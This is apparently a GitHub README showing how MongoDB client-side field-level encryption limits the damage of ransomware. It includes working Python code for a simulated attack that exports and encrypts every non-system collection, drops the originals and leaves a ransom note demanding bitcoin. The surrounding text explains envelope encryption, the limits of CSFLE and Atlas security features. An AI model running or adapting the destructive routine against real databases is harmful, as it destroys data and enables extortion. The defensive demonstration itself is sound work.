# mdb-ransomware-defense

[Global Ransomware Damage Costs Predicted To Exceed $265 Billion By 2031](https://cybersecurityventures.com/global-ransomware-damage-costs-predicted-to-reach-250-billion-usd-by-2031/)

**Important Note:**

This guide demonstrates CSFLE for educational purposes only. 

It simulates a ransomware attack to showcase the security benefits of CSFLE. 

**In no way does this guide encourage or promote malicious activities.** 

![alt](https://securityintelligence.com/wp-content/uploads/2018/09/si-ransomware-101-feature-630x330.png)

## MongoDB Atlas and CSFLE: A Powerful Defense Against Ransomware

### Key Security Benefits

1. **Enhanced Data Protection:**
   * **Multiple Layers of Security:** MongoDB Atlas offers a range of security features, including encryption at rest and in transit, access controls, and network security. CSFLE adds another layer of protection by encrypting sensitive data before it leaves the client.
   * **Granular Control:** CSFLE allows you to encrypt specific fields or data types, providing fine-grained control over data protection and minimizing the risk of exposure.

2. **Ransomware Resilience:**
   * **Data Unreadability:** Even if ransomware attackers gain access to your MongoDB Atlas cluster, they will be unable to decrypt and exploit the encrypted data.
   * **Reduced Negotiation Leverage:** By limiting the value of the stolen data, CSFLE can reduce the attackers' leverage in ransom negotiations.

3. **Compliance Adherence:**
   * **Industry Standards:** Many industries and regulations require data encryption to protect sensitive information. MongoDB Atlas and CSFLE can help organizations meet these compliance requirements.

4. **Reduced Business Impact:**
   * **Limited Data Exposure:** CSFLE can help limit the exposure of sensitive data, reducing the potential for financial loss, reputational damage, and legal consequences.

### How MongoDB Atlas and CSFLE Work Together

1. **Data Encryption:** MongoDB Atlas encrypts data at rest and in transit, providing a strong foundation for data security.
2. **CSFLE Integration:** CSFLE can be integrated into your application to encrypt sensitive data before it's transmitted to MongoDB Atlas.
3. **Enhanced Protection:** The combination of MongoDB Atlas's security features and CSFLE creates a multi-layered defense minimizing exposure of sensitive data.

## CSFLE is powered by Envelope Encryption

Envelope encryption is a cryptographic technique that involves using two layers of encryption to protect sensitive data. It's a core component of MongoDB's Queryable Encryption (QE) and provides a robust security mechanism.

### Understanding the Layers

1. **Data Encryption Key (DEK):** This is a unique key generated for each piece of data to be encrypted. The DEK is used to directly encrypt and decrypt the data.
2. **Customer Master Key (CMK):** The CMK is a key that protects the DEKs. It's typically stored in a secure hardware security module (HSM) or a cloud-based key management service.

### The Encryption Process

1. **Data Encryption:** The DEK is used to encrypt the sensitive data, creating a ciphertext.
2. **DEK Encryption:** The DEK itself is encrypted using the CMK, creating a ciphertext for the DEK.
3. **Storage:** Both the ciphertext (encrypted data) and the encrypted DEK are stored in the MongoDB database.

### The Decryption Process

1. **DEK Decryption:** The CMK is used to decrypt the encrypted DEK, retrieving the original DEK.
2. **Data Decryption:** The DEK is used to decrypt the ciphertext, revealing the original data.

### Benefits of Envelope Encryption

* **Strong Security:** By using two layers of encryption, envelope encryption provides a high level of security against unauthorized access.
* **Flexibility:** It allows for different encryption algorithms and key management strategies to be used for the DEK and CMK.
* **Efficiency:** The DEK can be reused for multiple pieces of data, improving encryption efficiency.
* **Compliance:** Envelope encryption can help organizations comply with data privacy regulations by ensuring sensitive data is protected at rest.

**Visual Representation:**

```
[Plaintext] -> [DEK] -> [Ciphertext]
[DEK] -> [CMK] -> [Encrypted DEK]
```

**Key Considerations:**

* **CMK Management:** Ensure the CMK is stored securely and managed properly.
* **DEK Rotation:** Regularly rotate DEKs to enhance security.
* **Key Length:** Use appropriate key lengths for both the DEK and CMK to provide adequate security.
* **Encryption Algorithms:** Choose strong encryption algorithms for both the DEK and CMK.

By understanding the principles of envelope encryption and its role in MongoDB's Client Side Field Level Encryption (CSFLE), you can make informed decisions about protecting sensitive data within your MongoDB applications.

## Protecting Against Ransomware with MongoDB CSFLE

In this Github repo, we delve into the details of protecting our MongoDB data against potential ransomware attacks. This is achieved by implementing client-side field-level encryption using MongoDB Atlas and Python. CSFLE encrypts sensitive fields within your application before sending them to the database, ensuring their confidentiality even if attackers gain access.
### Prerequisites

We'll utilize the following Python libraries:

* **pymongo**: MongoDB driver
* **bson**: BSON document creation and manipulation
* **cryptography.fernet**: High-level symmetric encryption

**Installation:**

```bash
pip install pymongo bson cryptography
```

### Setting Up a Local Atlas Environment

1. **Pull the Docker Image:**

   * **Latest Version:**
     ```bash
     docker pull mongodb/mongodb-atlas-local
     ```

2. **Run the Database:**

   ```bash
   docker run -p 27017:27017 mongodb/mongodb-atlas-local
   ```
   This command runs the Docker image, exposing port 27017 on your machine for connecting to the database.

### Setting Up Encryption

CSFLE targets specific fields in your documents for encryption. It's ideal for securing sensitive data like credit card numbers or social security numbers.

Here's how we configure CSFLE for our MongoDB client:

```python
from pymongo.encryption import AutoEncryptionOpts, ClientEncryption, Algorithm
from bson.codec_options import CodecOptions

# Generate a local master key (replace with a secure key management solution)
local_master_key = os.urandom(96)

# Define Key Management Service (KMS) provider and key vault namespace
kms_providers = {"local": {"key": local_master_key}}
key_vault_namespace = "encryption.__pymongoTestKeyVault"

# Create a MongoDB client with automatic encryption options
csfle_opts = AutoEncryptionOpts(kms_providers=kms_providers, key_vault_namespace=key_vault_namespace)
client = pymongo.MongoClient(auto_encryption_opts=csfle_opts)
```

**Note:** In production, replace `local_master_key` with a secure key management solution like AWS KMS or Google Cloud KMS.

## Creating an Encrypted Collection

Next, we'll create an encrypted collection in our MongoDB database where the sensitive data will be stored. We'll use the `create_encrypted_collection` method of the `ClientEncryption` class to do this.

```python
key_id1 = client_encryption.create_data_key("local", key_alt_names=["example1"])
encrypted_database_name, encrypted_collection_name = "test_db", "test_collection"
encrypted_fields_map = {"fields": [{"path": "ssn", "bsonType": "string", "keyId": key_id1, "queries": {"queryType": "equality"}}]}
client_encryption.create_encrypted_collection(client[encrypted_database_name], encrypted_collection_name, encrypted_fields_map, "local", local_master_key)
encrypted_collection = client[encrypted_database_name][encrypted_collection_name]
encrypted_collection.insert_one({"username": "test_user", "ssn": "123-45-6789"})
print(list(encrypted_collection.aggregate([{"$match": {"ssn": "123-45-6789"}}])))
#[{'_id': ObjectId('670128119965e019a8600e1e'), 'username': 'test_user', 'ssn': '123-45-6789', '__safeContent__': [b'\xd5\xdfm\xaf`\x85\x04T\xa65G\xe36\x1a\x10\xe8\x07\x84\xa5z\x15\xb7\xc8\xcb\xb0\x85d#\x1dp\xf7A']}]
```

In the code above, we start by creating a data key for our local KMS. We then define the database and collection names, and specify the fields to be encrypted in the `encrypted_fields_map`. We create the encrypted collection and insert a document into it. Finally, we print the result of a query matching the encrypted field.

## Encrypting and Exporting MongoDB Data

We'll define a function `export_encrypt_mongodb` that exports and encrypts a MongoDB collection. It uses the `mongoexport` command to export the collection to a JSON file. Then, it encrypts the JSON file using Fernet symmetric encryption, and finally deletes the original unencrypted JSON file. 

```python
def export_encrypt_mongodb(db_name, collection_name, key):
    command = ["mongoexport", "--db", db_name, "--collection", collection_name, "--out", f"./output/{db_name}-{collection_name}.json"]
    subprocess.run(command, check=True)
    with open(f'output/{db_name}-{collection_name}.json', 'rb') as f: data = f.read()
    with open(f'output/{db_name}-{collection_name}.json.enc', 'wb') as f: f.write(Fernet(key).encrypt(data))
    os.remove(f'output/{db_name}-{collection_name}.json')
    client[db_name][collection_name].drop()
```

## Decrypting MongoDB Data

We'll also define a function `decrypt_print_data` that decrypts and prints the encrypted data. This function will be useful to confirm that the data is still decryptable with the encryption key.

```python
def decrypt_print_data(db_name, collection_name, key):
    with open(f'output/{db_name}-{collection_name}.json.enc', 'rb') as f: 
        decrypted_data = Fernet(key).decrypt(f.read()).decode('utf-8')
        print("Confirm its still decryptable with the key: ", key)
        print(f"Decrypted data from {db_name}; {collection_name}:\n{decrypted_data}\n")
```

Finally, we simulate a ransomware attack:

```python
key = Fernet.generate_key()
for db_name in [db for db in client.list_database_names() if db not in ['admin', 'local', 'config']]:
    for collection_name in client[db_name].list_collection_names():
        export_encrypt_mongodb(db_name, collection_name, key)
        decrypt_print_data(db_name, collection_name, key)
client['RANSOM_NOTE']['README'].insert_one({'note': 'Your data has been encrypted. Send 1 BTC to restore your data.'})
```

## Full Code
```python
from pymongo.encryption import AutoEncryptionOpts, ClientEncryption, Algorithm
from bson.codec_options import CodecOptions
from bson.binary import STANDARD
import os, pymongo, subprocess
from cryptography.fernet import Fernet

def export_encrypt_mongodb(db_name, collection_name, key):
    command = ["mongoexport", "--db", db_name, "--collection", collection_name, "--out", f"./output/{db_name}-{collection_name}.json"]
    subprocess.run(command, check=True)
    with open(f'output/{db_name}-{collection_name}.json', 'rb') as f: data = f.read()
    with open(f'output/{db_name}-{collection_name}.json.enc', 'wb') as f: f.write(Fernet(key).encrypt(data))
    os.remove(f'output/{db_name}-{collection_name}.json')
    client[db_name][collection_name].drop()
def decrypt_print_data(db_name, collection_name, key):
    with open(f'output/{db_name}-{collection_name}.json.enc', 'rb') as f: 
        decrypted_data = Fernet(key).decrypt(f.read()).decode('utf-8')
        print("Confirm its still decryptable with the key: ", key)
        print(f"Decrypted data from {db_name}; {collection_name}:\n{decrypted_data}\n")

local_master_key = os.urandom(96)
kms_providers = {"local": {"key": local_master_key}}
key_vault_namespace = "encryption.__pymongoTestKeyVault"
csfle_opts = AutoEncryptionOpts(kms_providers=kms_providers, key_vault_namespace=key_vault_namespace)
client = pymongo.MongoClient(auto_encryption_opts=csfle_opts)

try:
    key_vault_db, key_vault_coll = key_vault_namespace.split(".", 1)
    key_vault = client[key_vault_db][key_vault_coll]
    key_vault.drop()
    key_vault.create_index("keyAltNames", unique=True)
except (pymongo.errors.InvalidName, pymongo.errors.DuplicateKeyError) as e: print(f"Error: {e}")

try:
    client_encryption = ClientEncryption(kms_providers, key_vault_namespace, client, CodecOptions(uuid_representation=STANDARD))
except pymongo.errors.EncryptionError as e: print(f"Error creating ClientEncryption: {e}")

key_id1 = client_encryption.create_data_key("local", key_alt_names=["example1"])
encrypted_database_name, encrypted_collection_name = "test_db", "test_collection"
encrypted_fields_map = {"fields": [{"path": "ssn", "bsonType": "string", "keyId": key_id1, "queries": {"queryType": "equality"}}]}
client_encryption.create_encrypted_collection(client[encrypted_database_name], encrypted_collection_name, encrypted_fields_map, "local", local_master_key)
encrypted_collection = client[encrypted_database_name][encrypted_collection_name]
encrypted_collection.insert_one({"username": "test_user", "ssn": "123-45-6789"})
print(list(encrypted_collection.aggregate([{"$match": {"ssn": "123-45-6789"}}])))
key = Fernet.generate_key()
for db_name in [db for db in client.list_database_names() if db not in ['admin', 'local', 'config']]:
    for collection_name in client[db_name].list_collection_names():
        export_encrypt_mongodb(db_name, collection_name, key)
        decrypt_print_data(db_name, collection_name, key)
client['RANSOM_NOTE']['README'].insert_one({'note': 'Your data has been encrypted. Send 1 BTC to restore your data.'})
```

## Output
```
2024-10-05T07:50:41.739-0400	connected to: mongodb://localhost/
2024-10-05T07:50:41.744-0400	exported 1 record
Confirm its still decryptable with the key:  b'qK2N6G8SEQ6OKquCdpGLvieWdprozfDUGfXbJfp65aM='
Decrypted data from test_db; test_collection:
{"_id":{"$oid":"670128119965e019a8600e1e"},"username":"test_user","ssn":{"$binary":{"base64":"DhInIwkz/0Wwo3nVQ+15dowC0EKRizwGdNTRSMAxwNqeOoJ35JQNZwBpTYA11qbIRTc2Lpk7fLfCAJ0vTMyMUmtEdpU2Scj0spb7Sqn9yyuwm/4BKpsl5zd//Hn0YTZmOEcFMTtnEmD0v5aOZyxHyJMtem5rcdXSXKOrn8qPFtZBzry/Co21aqzoEW4fbr9C5FyOUCHUELzUVDOqF586Yoru1d9tr2CFBFSmNUfjNhoQ6AeEpXoVt8jLsIVkIx1w90EndwIOqOTwNA1eUgX7nhkjWwYRHd3JY1zqhXHyoRvPAA==","subType":"06"}},"__safeContent__":[{"$binary":{"base64":"1d9tr2CFBFSmNUfjNhoQ6AeEpXoVt8jLsIVkIx1w90E=","subType":"00"}}]}
```

## Conclusion

In this scenario, while the simulated ransomware attack managed to encrypt the entire MongoDB database, it's crucial to remember that **sensitive data remained protected** thanks to Client-Side Field Level Encryption (CSFLE). CSFLE encrypts these fields within the application itself, rendering them unreadable even if attackers gain access to the database. This powerful feature demonstrates the importance of layered security strategies to safeguard sensitive information in the face of evolving cyber threats. 

## Limitations of Client-Side Field Level Encryption (CSFLE)

While CSFLE offers a valuable layer of security for your MongoDB data, it's important to be aware of its limitations:

* **Limited Encryption Scope:** CSFLE encrypts specific fields within documents, not entire documents or collections. This means attackers with access to the database can still potentially exploit unencrypted information.
* **Key Management Challenges:** Securely managing the encryption keys used by CSFLE is crucial. Losing these keys renders the encrypted data permanently inaccessible. In the provided example, a local master key was used for simplicity, but in production environments, a robust Key Management Service (KMS) like AWS KMS or Google Cloud KMS is highly recommended.
* **Performance Overhead:** Encryption and decryption processes associated with CSFLE can introduce slight performance overhead, especially for write-heavy workloads.
* **Limited Query Capabilities:** CSFLE may not support all query types and operators on encrypted fields. Complex queries involving encrypted fields might require additional processing or workarounds. 
* **Platform Dependence:** CSFLE compatibility varies depending on the MongoDB server version and driver used. Ensure your environment is compatible before implementing CSFLE.

## The Challenge of Data-Layer Ransomware

Ransomware attacks targeting the data layer pose a unique challenge due to the potential for attackers to possess legitimate credentials and access rights. This allows them to execute operations like exporting, dropping, or modifying data without raising immediate suspicion.

**Key Difficulties:**

* **Credential Compromise:** Attackers may have obtained valid credentials through various means, including phishing, social engineering, or exploiting vulnerabilities.
* **Elevated Privileges:** Compromised accounts might have elevated privileges, enabling attackers to perform actions that would normally be restricted.
* **Insider Threats:** Employees with authorized access can potentially misuse their privileges to encrypt or delete data.

## MongoDB Atlas Security Features

MongoDB Atlas offers several features that help mitigate the challenges associated with data-layer ransomware:

1. **Granular Access Controls:** MongoDB Atlas provides fine-grained control over user permissions, allowing you to restrict access to specific databases, collections, and operations. This minimizes the potential damage if an attacker's credentials are compromised.
2. **Activity Logging:** MongoDB Atlas logs user activity, including database access, queries, and changes made to data. This enables you to monitor for suspicious behavior and detect potential attacks early on.
3. **Network Isolation:** MongoDB Atlas allows you to isolate your database clusters from the public internet, reducing the risk of unauthorized access.
4. **Role-Based Access Control (RBAC):** RBAC enables you to define different roles with specific permissions, ensuring that users only have access to the data and operations they need to perform their jobs.
5. **Encryption at Rest and in Transit:** MongoDB Atlas encrypts data both while it's stored on disk and while it's being transmitted over the network, providing additional protection against unauthorized access.
6. **Encryption in Use:** **MongoDB Atlas** and **Client-Side Field Level Encryption (CSFLE)** together can help organizations significantly reduce their risk of falling victim to ransomware.
7. **Backup and Recovery:** MongoDB Atlas offers robust backup and recovery capabilities, including automatic backups, manual backups, and continuous backups. This ensures that you can restore your data in the event of a ransomware attack or other data loss.
8. **Recovery Time Objective (RTO) and Recovery Point Objective (RPO):** MongoDB Atlas allows you to define your RTO and RPO, ensuring that you can recover your data within a specified timeframe and with minimal data loss.

By leveraging these features, MongoDB Atlas helps organizations strengthen their defenses against data-layer ransomware attacks and mitigate the risks associated with compromised credentials, elevated privileges, and data loss.

